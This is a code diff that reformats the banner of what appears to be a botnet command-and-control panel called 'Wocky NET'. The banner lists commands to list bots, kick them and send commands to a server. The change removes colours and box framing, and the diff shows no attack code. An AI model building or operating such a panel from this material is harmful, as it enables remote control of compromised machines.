@@ -2,19 +2,17 @@ import os, sys, time
 from ..Config.main import *
 from .functions import *
 
-banner = """\x1b[31m   ╔════════════════════════════════════════════════════════════════════════╗
-   ║                          Official Wocky NET                            ║
-   ╠════════════════════════════════════════════════════════════════════════╣
-   ║ [Zerda]             !~  Welcome To Wocky NET ~!                [v1.00] ║
-   ║ - Official bot testing CNC                                             ║
-   ║ _______________________________________________________________        ║
-   ║     COMMANDS               USAGE               DESCRIPTION             ║
-   ║     - kick                 kick <SID>          kick bot                ║
-   ║     - cmd                  cmd <cmd>           send a cmd to server    ║
-   ║     - bots                 bots                list of bots            ║
-   ║     - clear                c                   clear screen            ║
-   ╚════════════════════════════════════════════════════════════════════════╝
-\x1b[39m"""
+banner = """                              Official Wocky NET
+   
+     [Zerda]             !~  Welcome To Wocky NET ~!                [v1.00]
+     - Official bot testing CNC
+     _______________________________________________________________
+         COMMANDS               USAGE               DESCRIPTION
+         - kick                 kick <SID>          kick bot
+         - cmd                  cmd <cmd>           send a cmd to server
+         - bots                 bots                list of bots
+         - clear                c                   clear screen
+"""
 cp_hostname = "QuantumCP >> "
 
 def CP():
